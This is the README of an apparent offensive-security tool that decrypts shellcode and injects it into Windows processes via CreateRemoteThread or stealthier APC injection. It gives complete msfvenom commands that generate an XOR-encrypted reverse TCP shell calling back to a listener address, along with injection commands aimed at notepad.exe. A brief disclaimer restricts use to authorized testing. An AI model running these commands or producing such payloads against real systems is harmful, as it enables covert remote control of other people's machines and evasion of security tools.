# 🔥 Memory Manipulation Utility 🔥

> A powerful C++ tool to read, XOR‑encrypt/decrypt, and inject hex shellcode into Windows processes via CreateRemoteThread or APC injection. 🛠️💉

---

## 🚀 Features

- 📂 **Hex Payload I/O**: Read and write hex‑encoded shellcode files
- 🔑 **XOR Encryption/Decryption**: Secure your payload at rest with a key, decrypt in-memory just before execution
- 💉 **Injection Methods**:
  - **CreateRemoteThread** injection
  - **APC (Asynchronous Procedure Call)** injection for stealth
- 🔍 **Payload Validation**:
  - PE header check (MZ)
  - Entropy analysis to detect invalid data
- 🎛️ **Flexible CLI**: Intuitive options for encryption, decryption, and injection

---

## 📋 Requirements

- Windows OS (x64)
- Visual Studio or a compatible C++17 compiler
- **msfvenom** (part of Metasploit) for shellcode generation

---

## ⚙️ Installation & Build

1. Clone this repo:
   ```bash
   git clone https://github.com/ShorterKing/Hexinjector-XOR.git
   cd memory-manipulation-utility
   ```
2. Build with Visual Studio or via CLI:
   ```powershell
   cl /std:c++17 /O2 main.cpp /link /out:memutil.exe
   ```

---

## 🐍 Generating Hex Shellcode with msfvenom

Generate a reverse TCP shell (unencrypted):

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.26.243.224 LPORT=4444 -f hex -o payload.hex
```

Generate and XOR-encrypt in one step:

```bash
msfvenom -p windows/x64/shell_reverse_tcp --encrypt xor --encryption-key hacker LHOST=172.26.243.224 LPORT=4444 -f hex -o payload_encrypted.hex
```

---

## 💻 Usage

```bash
memutil.exe [options]
```

| Option | Description                                                      | Example                                                        |
|:------:|:-----------------------------------------------------------------|:---------------------------------------------------------------|
| `-i`   | Input hex payload file                                           | `-i payload.hex`                                               |
| `-p`   | Target process PID or executable name                            | `-p notepad.exe` or `-p 1234`                                  |
| `-x`   | XOR key for encryption/decryption                                | `-x secret123`                                                 |
| `-e`   | **Encrypt** mode: specify output file (will not inject)          | `-e encrypted_payload.hex`                                     |
| `-a`   | Use **APC** injection instead of CreateRemoteThread              | `-a`                                                           |
| `-h`   | Display help                                                     | `-h`                                                           |


### 🔒 Encrypt Payload (no injection)

```bash
memutil.exe -i payload.hex -e payload_enc.hex -x myKey
```

- Reads `payload.hex` ➡️ XOR‑encrypts with key `myKey` ➡️ writes `payload_enc.hex`

### 💉 Inject Payload

1. **Raw** payload into Notepad:
   ```bash
   memutil.exe -i payload.hex -p notepad.exe
   ```
2. **Encrypted** payload (decrypt & inject):
   ```bash
   memutil.exe -i payload_enc.hex -p 1234 -x myKey
   ```
3. **APC** injection:
   ```bash
   memutil.exe -i payload.hex -p notepad.exe -a
   ```

---

## 🔍 How It Works

1. **ReadHexFile**: Parses `.hex` into a byte vector
2. **XORData**: Applies XOR with key (same function for encrypt/decrypt)
3. **ValidatePayload**: Checks PE signature (`0x4D 0x5A`) and entropy
4. **Injection**:
   - **CreateRemoteThread**: Standard remote thread creation
   - **APC**: Queues an Asynchronous Procedure Call on a target thread for stealth

---

## 📝 Example Output

```
[+] Read 512 bytes from payload.hex
[+] XOR decryption applied with key: myKey
[+] Payload appears to be a valid PE executable
[+] Resolved process notepad.exe to ID: 4321
[+] Successfully injected payload into process 4321
[+] Operation completed successfully
```

---

## ⚠️ Disclaimer

> **For educational and authorized penetration testing only!**
> Misuse of this tool against systems without permission is illegal.

---

## 🙏 Contributions

Feel free to ⭐️ the repo and submit PRs to improve functionality! 🛠️

---

© 2025 Akshat Singh • [Apache License 2.0](LICENSE)

